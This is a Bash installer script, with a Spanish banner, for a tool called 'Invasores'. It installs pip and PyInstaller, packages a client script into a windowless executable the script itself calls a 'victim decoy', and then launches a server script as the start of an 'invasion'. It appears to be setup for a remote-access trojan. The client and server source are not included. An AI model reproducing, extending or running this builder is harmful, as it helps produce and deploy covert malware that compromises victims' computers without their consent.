clear;

echo -e "\e[96m

  
  ██▓ ███▄    █ ██▒   █▓ ▄▄▄        ██████  ▒█████   ██▀███  ▓█████   ██████ 
 ▓██▒ ██ ▀█   █▓██░   █▒▒████▄    ▒██    ▒ ▒██▒  ██▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ 
 ▒██▒▓██  ▀█ ██▒▓██  █▒░▒██  ▀█▄  ░ ▓██▄   ▒██░  ██▒▓██ ░▄█ ▒▒███   ░ ▓██▄   
 ░██░▓██▒  ▐▌██▒ ▒██ █░░░██▄▄▄▄██   ▒   ██▒▒██   ██░▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒
 ░██░▒██░   ▓██░  ▒▀█░   ▓█   ▓██▒▒██████▒▒░ ████▓▒░░██▓ ▒██▒░▒████▒▒██████▒▒
 ░▓  ░ ▒░   ▒ ▒   ░ ▐░   ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░
  ▒ ░░ ░░   ░ ▒░  ░ ░░    ▒   ▒▒ ░░ ░▒  ░ ░  ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░
  ▒ ░   ░   ░ ░     ░░    ░   ▒   ░  ░  ░  ░ ░ ░ ▒    ░░   ░    ░   ░  ░  ░  
  ░           ░      ░        ░  ░      ░      ░ ░     ░        ░  ░      ░  
                   ░                                                             	
\e[93m

                   Instalador creado por Kirari

                 https://github.com/Kirari-Senpai \e[39m

";

echo -e "\n\n[\e[96m*\e[39m] Actualizando lista de repositorios\n";
sudo apt update -y;
echo -e "\n\n[\e[96m*\e[39m] Instalando Python Pip3\n";
sudo apt install python3-pip;
echo -e "\n\n[\e[96m*\e[39m] Instalando Pyinstaller\n";
pip3 install pyinstaller;
echo -e "\n\n[\e[96m*\e[39m] Instalando dependencias para Invasores\n";
pip3 install -r requirements.txt;
echo -e "\n\n[\e[96m*\e[39m] Creando señuelo víctima...\n";
cd client/
pyinstaller --onefile --noconsole client.py;
echo -e "\n\n[\e[92m+\e[39m] Señuelo creado con exito.\n";
echo -e "\n\n[\e[96m*\e[39m] Iniciando invasión\n";
cd ../server/
sleep 2;
python3 invasores.py;
